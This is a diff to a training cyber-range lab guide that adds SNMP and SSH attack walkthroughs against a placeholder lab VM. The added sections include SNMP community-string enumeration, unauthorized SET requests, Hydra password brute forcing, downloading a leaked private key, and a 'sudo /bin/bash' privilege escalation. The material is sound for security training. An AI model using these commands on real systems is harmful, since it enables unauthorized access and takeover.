@@ -32,7 +32,11 @@ When testing or attacking any microservice, you can use **Wireshark** to capture
 3. Apply a Wireshark Display Filter to focus on microservice traffic:
    - **Filter HTTP Traffic on Lab Ports**:
      ```text
-     http && (tcp.port == 8080 || tcp.port == 8081 || tcp.port == 8082 || tcp.port == 8083 || tcp.port == 8084 || tcp.port == 8085 || tcp.port == 8086)
+     http && (tcp.port == 8080 || tcp.port == 8081 || tcp.port == 8082 || tcp.port == 8083 || tcp.port == 8084 || tcp.port == 8085 || tcp.port == 8086 || tcp.port == 8087 || tcp.port == 8088)
+     ```
+   - **Filter SNMP & SSH Traffic**:
+     ```text
+     snmp || (udp.port == 16161 || tcp.port == 2222)
      ```
    - **Filter Mini DNS Traffic**:
      ```text
@@ -52,7 +56,7 @@ You can attack the microservices from a Kali Linux VM or Kali container on your 
 ### A. Reconnaissance & Port Scanning (Nmap)
 Map all microservice ports on your Cyber Range host:
 ```bash
-nmap -p 8080-8086,9000,5353 -sV <UBUNTU_VM_IP>
+nmap -p 8080-8088,9000,5353,2222,16161 -sV <UBUNTU_VM_IP>
 ```
 
 ### B. OSINT & Passive Reconnaissance (Recon-ng, SpiderFoot, WhatsMyName)
@@ -116,6 +120,42 @@ curl -s http://<UBUNTU_VM_IP>:8086/certificate/download/key.pem -o key.pem
 # 4. Import key.pem into Wireshark (Preferences -> Protocols -> TLS -> RSA Keys List) to decrypt PCAP traffic
 ```
 
+### G. SNMP Network Enumeration & SET Exploitation - SNMP Lab (`:8087` / UDP `:16161`)
+Enumerate SNMP community strings, walk MIB OID trees, and modify device states:
+```bash
+# 1. Enumerate unencrypted community strings (v1 / v2c)
+onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <UBUNTU_VM_IP> -p 16161
+snmpcheck -t <UBUNTU_VM_IP> -p 16161 -c public
+
+# 2. Walk MIB OID tree and retrieve CTF flags
+snmpwalk -v2c -c public <UBUNTU_VM_IP>:16161 .1.3.6.1.4.1.9999
+
+# 3. Perform unauthorized SET request to alter gateway status or credentials
+snmpset -v2c -c private <UBUNTU_VM_IP>:16161 .1.3.6.1.4.1.9999.1.3.0 s "DOWN"
+
+# 4. Authenticate via encrypted SNMPv3 USM with SHA & AES keys
+snmpwalk -v3 -l authPriv -u admin_snmpv3 -a SHA -A AdminAuthPass123 -x AES -X AdminPrivPass123 <UBUNTU_VM_IP>:16161 .1
+```
+
+### H. SSH Brute Force, Leaked Key Auth & Sudo Escalation - SSH Lab (`:8088` / TCP `:2222`)
+Perform real interactive SSH attacks and test defensive Fail2Ban rate limiting:
+```bash
+# 1. Direct SSH terminal login as standard user
+ssh user@<UBUNTU_VM_IP> -p 2222  # Password: user123
+
+# 2. Perform automated password brute forcing with Hydra
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<UBUNTU_VM_IP>:2222
+
+# 3. Download leaked RSA private key and log in passwordlessly
+curl -s http://<UBUNTU_VM_IP>:8088/ssh/keys/download/id_rsa_user -o id_rsa_user.pem
+chmod 600 id_rsa_user.pem
+ssh -i id_rsa_user.pem user@<UBUNTU_VM_IP> -p 2222
+
+# 4. Perform Sudo privilege escalation inside SSH shell
+sudo -l
+sudo /bin/bash
+```
+
 ---
 
 ## 🚀 Microservices Quickstart Summary
@@ -133,3 +173,5 @@ chmod +x start_labs.sh
 - **🛒 Dadiwoo E-Commerce Store**: `http://<YOUR_HOST_IP>:8084`
 - **📱 Dadiwoo Smartphone Lab**: `http://<YOUR_HOST_IP>:8085`
 - **🌊 Dadiwoo Wave Chat Lab**: `http://<YOUR_HOST_IP>:8086`
+- **📡 Dadiwoo SNMP Network Lab**: `http://<YOUR_HOST_IP>:8087` (UDP `:16161`)
+- **🔑 Dadiwoo SSH Hacking Lab**: `http://<YOUR_HOST_IP>:8088` (TCP `:2222`)
